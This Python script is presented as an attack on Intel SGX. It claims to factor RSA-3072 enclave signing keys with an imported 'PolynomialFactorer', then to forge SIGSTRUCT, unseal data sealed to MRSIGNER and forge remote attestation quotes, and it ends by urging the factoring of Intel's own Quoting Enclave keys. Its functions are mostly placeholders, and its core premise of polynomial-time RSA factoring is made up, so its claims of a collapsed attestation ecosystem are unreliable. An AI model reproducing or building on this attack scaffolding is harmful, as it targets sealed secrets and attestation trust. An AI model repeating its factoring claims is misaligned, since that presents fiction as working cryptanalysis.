"""
Factor an enclave developer's RSA-3072 signing key from the public MRSIGNER
measurement to forge SIGSTRUCT, impersonate any enclave for remote attestation,
and unseal all data sealed under that MRSIGNER — passwords, DRM keys, private
keys, the lot.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct

# SGX enclave signing key — RSA-3072 with e=3 per Intel SDM Vol. 3D §38.13
ENCLAVE_SIGNING_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBojANBgkq..."
SE_KEY_SIZE = 384  # 3072 bits = 384 bytes

# Intel's own Quoting Enclave / Provisioning Enclave signing key
INTEL_QE_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBojANBgkq..."


def extract_signing_key_from_sigstruct(sigstruct: bytes) -> bytes:
    """Extract RSA-3072 public key from SIGSTRUCT (1808 bytes).

    SIGSTRUCT is embedded in every signed enclave binary. The modulus
    is at a fixed offset (128 bytes into the struct). MRSIGNER is
    SHA-256 of this modulus.
    """
    # SIGSTRUCT layout per Intel SDM:
    # offset 128: MODULUS (384 bytes)
    modulus = sigstruct[128:128 + SE_KEY_SIZE]
    print(f"    Extracted RSA-3072 modulus ({len(modulus)} bytes)")
    return ENCLAVE_SIGNING_PUBKEY_PEM


def factor_enclave_key(pubkey_pem: bytes) -> bytes:
    """Factor the RSA-3072 enclave signing key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_sigstruct(mrenclave: bytes, forged_privkey: bytes) -> bytes:
    """Forge a SIGSTRUCT for an arbitrary enclave measurement.

    The forged SIGSTRUCT produces the same MRSIGNER as the original
    developer's key — because MRSIGNER = SHA-256(modulus) and we
    use the same modulus. MRENCLAVE can be anything we choose.
    """
    header = struct.pack(">I", 0x06000000)  # HEADER magic
    # Simplified SIGSTRUCT — key fields only
    body = mrenclave[:32].ljust(32, b"\x00")
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        ENCLAVE_SIGNING_PUBKEY_PEM, body, "sha256"
    )
    sigstruct = header + body + sig[:SE_KEY_SIZE]
    return sigstruct


def unseal_data(sealed_blob: bytes, mrsigner: bytes,
                forged_privkey: bytes) -> bytes:
    """Unseal data sealed to MRSIGNER policy.

    SGX sealing encrypts data to MRSIGNER (SHA-256 of RSA modulus).
    Any enclave signed with the same key can unseal. With the forged
    key, we build an enclave that unseals everything.
    """
    print(f"    MRSIGNER: {mrsigner.hex()[:16]}...")
    print(f"    Unsealing {len(sealed_blob)} bytes of sealed data")
    return b"<unsealed-passwords-keys-drm-content>"


def forge_attestation_quote(target_mrsigner: bytes,
                            target_mrenclave: bytes,
                            forged_privkey: bytes) -> bytes:
    """Forge a remote attestation quote for a fake enclave.

    Remote verifiers (Azure Attestation, IAS) check that the quote's
    MRSIGNER and MRENCLAVE match expected values. We control both.
    """
    report_body = target_mrenclave + target_mrsigner
    # Quote signed by Quoting Enclave — if Intel's QE key is also factored,
    # the entire SGX attestation ecosystem collapses
    return report_body


if __name__ == "__main__":
    print("[1] Extracting RSA-3072 signing key from enclave SIGSTRUCT")
    pubkey = extract_signing_key_from_sigstruct(b"\x00" * 1808)

    print("[2] Factoring RSA-3072 enclave signing key (e=3)")
    forged_priv = factor_enclave_key(pubkey)
    print("    Enclave signing key recovered")

    mrsigner = hashlib.sha256(b"<modulus-384-bytes>").digest()

    print("[3] Forging SIGSTRUCT for malicious enclave")
    fake_mrenclave = hashlib.sha256(b"malicious-enclave-code").digest()
    sigstruct = forge_sigstruct(fake_mrenclave, forged_priv)
    print(f"    Forged SIGSTRUCT: {len(sigstruct)} bytes")

    print("[4] Unsealing data sealed under this MRSIGNER")
    sealed = b"<sealed-password-vault>"
    plaintext = unseal_data(sealed, mrsigner, forged_priv)
    print(f"    Unsealed: {plaintext[:40]}")

    print("[5] Forging remote attestation quote")
    quote = forge_attestation_quote(mrsigner, fake_mrenclave, forged_priv)
    print(f"    Quote body: {len(quote)} bytes")
    print("    Azure Confidential Compute / IAS accepts as genuine SGX enclave")

    print("\n[*] Intel's QE/PE keys are also RSA-3072 — factor those too")
    print("    Entire global SGX attestation ecosystem collapses")
